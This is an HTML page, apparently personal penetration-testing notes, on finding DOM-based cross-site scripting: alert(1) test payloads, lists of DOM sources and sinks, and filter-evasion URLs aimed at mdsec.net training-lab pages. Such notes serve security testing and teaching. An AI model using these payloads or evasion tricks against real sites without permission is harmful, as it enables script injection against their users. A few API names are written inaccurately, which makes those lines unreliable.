@@ -1,0 +1,71 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b><span style="font-size: 12pt">DETECTION</span></b><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+Burp active scanner doesn't detect DOM based XSS reliably. Do manual job.<br/>
+<br/>
+</span><b>Basic detection strings</b><br/>
+<br/>
+&quot;&lt;script&gt;alert(1)&lt;/script&gt;<br/>
+&quot;;alert(1)//<br/>
+'-alert(1)-'<b><br/>
+</b><b><br/>
+</b><b>Review all javascript code and search for DOM manipulating API. These functions accept user input.</b><br/>
+<tt><br/>
+document.location()<br/>
+document.URL()<br/>
+document.URLUnencoded()<br/>
+document.referrer()<br/>
+window.location()<br/>
+</tt><tt>location.hash.substring(1)</tt><br/>
+<br/>
+<b>For every instance of preceding API search if user input can be passed into following functions (sinks)</b><br/>
+<b><br/>
+</b><b>Functions....</b><tt><br/>
+</tt><tt>document.write()<br/>
+document.writeln()<br/>
+document.body.innerHtml n eval()<br/>
+window.execScript()<br/>
+window.setInterval()<br/>
+window.setTimeout()<br/>
+eval()<br/>
+Function()<br/>
+setImmediate()<br/>
+execScript()<br/>
+crypto.generateCRMFRequest()<br/>
+</tt><b><br/>
+</b><b>Values....</b><tt><br/>
+</tt><tt>ScriptElement.src<br/>
+ScriptElement.text<br/>
+ScriptElement.textContent<br/>
+ScriptElement.innerText<br/>
+&lt;anyTag&gt;.&lt;onEventName&gt;<br/>
+</tt><br/>
+<b>jQuery sinks</b><br/>
+<tt><br/>
+element.add(userContent)<br/>
+element.append(userContent)<br/>
+element.after(userContent)<br/>
+element.before(userContent)<br/>
+element.html(userContent)<br/>
+element.prepend(userContent)<br/>
+element.replaceWith(userContent)<br/>
+element.wrap(userContent)<br/>
+element.wrapAll(userContent)<br/>
+</tt><tt>innerHTML = userContent</tt><br/>
+<br/>
+<b><span style="font-size: 12pt">FILTERS EVASION</span></b><br/>
+<br/>
+All methods valid for reflected XSS<br/>
+DOM XSS specific evasion:<br/>
+<ul><li>payload can be placed into an invented parameter appended after the vulnerable parameter</li>
+<tt><li style="list-style-type: none">http://mdsec.net/error/76/Error.ashx?message=Sorry%2c+an+error+occurred&amp;foo=&lt;script&gt;alert(1)&lt;/script&gt;</li>
+</tt><li style="list-style-type: none"><tt>http://mdsec.net/error/79/Error.ashx?foomessage=&lt;script&gt;alert(1)&lt;/script&gt;&amp;message=Sorry%2c+an+error+occurred</tt></li>
+<li style="list-style-type: none"><tt>http://mdsec.net/error/79/Error.ashx#message=&lt;script&gt;alert(1)&lt;/script&gt;</tt></li>
+</ul>
+<ul><li>placing the payload to the right of the HTML fragment character (#)</li>
+<tt><li style="list-style-type: none">http://mdsec.net/error/82/Error.ashx?message=Sorry%2c+an+error+occurred#&lt;script&gt;alert(1)&lt;/script&gt;</li>
+</tt></ul>
+</body></html>
